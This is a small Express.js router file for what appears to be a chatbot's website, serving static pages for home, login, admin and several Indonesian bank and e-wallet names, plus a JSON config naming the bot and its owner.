__path = process.cwd()

var express = require('express');
var router = express.Router();

router.get('/', (req, res) => {
    res.sendFile(__path + '/views/index.html')
})

router.get('/masuk', (req, res) => {
    res.sendFile(__path + '/views/masuk.html')
})

router.get('/masukk', (req, res) => {
    res.sendFile(__path + '/views/masukk.html')
})

router.get('/admin', (req, res) => {
    res.sendFile(__path + '/views/admin.html')
})

router.get('/adminn', (req, res) => {
    res.sendFile(__path + '/views/adminn.html')
})

router.get('/bca', (req, res) => {
    res.sendFile(__path + '/views/bca.html')
})

router.get('/bri', (req, res) => {
    res.sendFile(__path + '/views/bri.html')
})

router.get('/bni', (req, res) => {
    res.sendFile(__path + '/views/bni.html')
})

router.get('/mandiri', (req, res) => {
    res.sendFile(__path + '/views/mandiri.html')
})

router.get('/dana', (req, res) => {
    res.sendFile(__path + '/views/dana.html')
})

router.get('/cimb', (req, res) => {
    res.sendFile(__path + '/views/cimb.html')
})

router.get('/permata', (req, res) => {
    res.sendFile(__path + '/views/permata.html')
})

router.get('/config', (req, res) => {
    config = {
        status: true,
        result: {
            prefix : 'z',
            namabot: 'Alphabot',
            namaowner: 'zeeone',
            instagram: 'zee.oneee',
            youtube : 'wandi'
        }
    }
    res.json(config)
})

module.exports = router
